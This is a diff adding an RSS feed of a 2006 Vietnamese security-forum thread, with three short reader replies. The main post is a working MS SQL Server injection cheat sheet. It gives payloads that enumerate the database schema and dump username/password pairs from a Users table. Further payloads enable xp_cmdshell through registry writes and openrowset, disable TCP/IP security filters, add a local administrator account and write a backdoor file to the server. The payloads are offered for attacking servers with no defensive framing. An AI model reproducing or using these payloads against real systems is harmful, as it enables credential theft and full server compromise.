@@ -1,0 +1,167 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "SQL - Injection cơ bản và nâng cao "]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/12.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "SQL - Injection cơ bản và nâng cao "]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>SQL - Injection cơ bản và nâng cao </title>
+				<description><![CDATA[ A. Khai thac thong tin ve SQL server
+
+<font color='red'>1. Khai thac thong tin ve MS SQL server</font>
+' Thông tin về version của MS SQL
+and 1=@@version--sp_password
+'Thông tin về servername
+and 1=@@servername--sp_password
+'Thông tin về SERVICENAME
+and 1=@@SERVICENAME--sp_password
+'Thông tin về UID
+and 1=system_user--sp_password
+'Thông tin về PWD
+?
+
+<font color='red'>2. Khai thac thong tin ve Database</font>
+'Thông tin về tên database
+and 1=db_name()--sp_password
+
+<font color='red'>3. Khai thac thong tin ve Table</font>
+'Khai thác thông tin về Table
+having 1=1--sp_password
+'Khai thác thông tin về các Table
+group by QUESTIONS.QUEST_ID having 1=1--sp_password
+
+'Khai thác thông tin về Table
+UNION SELECT TOP 1 TABLE_NAME FROM 
+INFORMATION_SCHEMA.TABLES--sp_password
+'Khai thác thông tin về các Table
+UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE
+TABLE_NAME NOT IN ('PRODUCTS')--sp_password
+
+'Khai thác thông tin về Table
+and 38=convert(int,(select top 1 table_name from
+information_schema.tables))--sp_password
+'Khai thác thông tin về các Table
+and 38=convert(int,(select top 1 table_name from 
+information_schema.tables
+where table_name not in ('PRODUCTS')))--sp_password
+
+<font color='red'>4. Khai thac thong tin ve Column</font>
+'Khai thác thông tin về Column
+and 38=convert(int,(select top 1 column_name from
+information_schema.columns where 
+table_name=('QUESTIONS')))--sp_password
+'Khai thác thông tin về các Column
+and 38=convert(int,(select top 1 column_name from
+information_schema.columns where table_name=('QUESTIONS') and 
+column_name
+not in ('QUEST_ID')))--sp_password
+
+<font color='red'>5. Khai thac thong tin ve Content</font>
+'Khai thác thông tin với kiểu ngày giờ
+and 1=convert(char(20),(select top 1 NgayXuat from 
+PhieuXuat))--sp_password
+'Khai thác thông tin dòng tiếp theo với kiểu ngày giờ
+and 1=convert(char(20),(select top 1 NgayXuat from PhieuXuat where
+NgayXuat<>'Mar 12 2003 12:00AM '))--sp_password
+'Khai thác thông tin về dòng đầu tiên
+and 1=convert(int,(select top 1 userName+'/'+userPass from
+Users))--sp_password
+'Khai thác thông tin dòng tiếp theo
+and 1=convert(int,(select top 1 userName+'/'+userPass from Users where
+userName not in('admin')))--sp_password
+
+<font color='red'>6. Khai thac thong tin ve Table, Column, Content cua cac database tiep</font>
+
+Chú ý:
+để nhận biết kiểu của cột
+dữ liệu ta dùng "image" để kiểm tra:
+-Nếu là trường kiểu ngày/giờ
+Dùng: char,nchar,nvarchar,varchar
+
+
+B. Upload backdoor lên host
+<font color='red'>1. Xác định mức quyền và cho phép thực thi</font>lệnh của MS SQL server
+'Xác định mức quyền
+;select * from openrowset('sqloledb','';;,'')--
+'Thay đổi mức quyền
+;exec master..xp_regwrite
+HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\MSSQLServer\Providers\SQLOLEDB','AllowInProcess',REG_DWORD,1--
+;exec master..xp_regwrite
+HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\MSSQLServer\Providers\SQLOLEDB','DisallowAdhocAccess',REG_DWORD,0--
+'Xoá bỏ và khôi phục Log và firewall trong MS SQL
+;exec master..xp_regdeletevalue
+'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Services\Tcpip\Parameters','EnableSecurityFilters'--
+;exec master..xp_regwrite
+'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Services\Tcpip\Parameters','EnableSecurityFilters',REG_DWORD,0--
+'Cho phép sử dụng MASTER..XP_CMDSHELL & ALLOW UPDATES
+;select * from openrowset('sqloledb',
+'server=Digital;uid=BUILTIN\Administrators;pwd=', 'set fmtonly off 
+select
+1 exec master..sp_addextendedproc xp_cmd,''xpsql70.dll'' exec 
+sp_configure
+''allow updates'', ''1'' reconfigure with override')--
+
+<font color='red'>2. Do thám đưa thêm các thông tin</font>
+'Do tham IP của server và đưa vào bảng testip
+;drop table testip create table testip(stt int identity,dcip
+varchar(1000)) insert into testip exec master..xp_cmdshell 'ipconfig'--
+'Cộng thêm một quyền quản trị mới
+;select * from openrowset('sqloledb',
+'server=digital;uid=BUILTIN\Administrators;pwd=', 'set fmtonly off 
+select
+1 exec xp_cmdshell "net user a /add %26 net localgroup administrators a
+/add"')-- (%26 == "&")
+
+<font color='red'>3. Đưa backdoor lên server</font>'Upload backdoor lên server vào thư mục C:\WINDOWS\system32
+;select * from openrowset('sqloledb',
+'server=digital;uid=BUILTIN\Administrators;pwd=', 'set fmtonly off 
+select
+1 exec master..xp_cmdshell "chube >>runfile.txt"')--
+;select * from openrowset('sqloledb',
+'server=digital;uid=BUILTIN\Administrators;pwd=', 'set fmtonly off 
+select
+1 exec master..xp_cmdshell "chube >>runfile.txt & hamhoc
+>>runfile.txt"')--
+'Kiểm tra xem backdoor đã upload thành công chưa
+;drop table testip create table testip(stt int identity,dcip
+varchar(1000)) insert into testip exec master..xp_cmdshell 'dir
+runfile.txt'--
+
+C. Chạy backdoor trên server
+1. Xác nhận backdoor đã được kích hoạt
+
+2. Chiếm toàn bộ quyền điều khiển server
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/458.hva#1260</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/458.hva#1260</link>
+				<pubDate><![CDATA[Mon, 26 Jun 2006 22:05:52]]> GMT</pubDate>
+				<author><![CDATA[ darthtuan]]></author>
+			</item>
+			<item>
+				<title>SQL - Injection cơ bản và nâng cao </title>
+				<description><![CDATA[ là sao ? anh có thể nói rõ hơn đc ko ? em cám ơn !]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/458.hva#29718</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/458.hva#29718</link>
+				<pubDate><![CDATA[Sun, 10 Dec 2006 19:04:47]]> GMT</pubDate>
+				<author><![CDATA[ longbon]]></author>
+			</item>
+			<item>
+				<title>SQL - Injection cơ bản và nâng cao </title>
+				<description><![CDATA[ Bài này hay quá!
+Thanks bác darthtuan nhiều!]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/458.hva#30061</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/458.hva#30061</link>
+				<pubDate><![CDATA[Tue, 12 Dec 2006 10:50:48]]> GMT</pubDate>
+				<author><![CDATA[ FaL]]></author>
+			</item>
+			<item>
+				<title>Re: SQL - Injection cơ bản và nâng cao </title>
+				<description><![CDATA[  :)) Ui lâu nay em làm web có liên quan đến SQL, đi tìm mấy cái này mãi mà không thấy. Bây giờ đã gặp được roài. Em xin chan thành cảm ơn.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/458.hva#32251</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/458.hva#32251</link>
+				<pubDate><![CDATA[Fri, 22 Dec 2006 18:35:13]]> GMT</pubDate>
+				<author><![CDATA[ zicusa]]></author>
+			</item>
+	</channel>
+</rss>
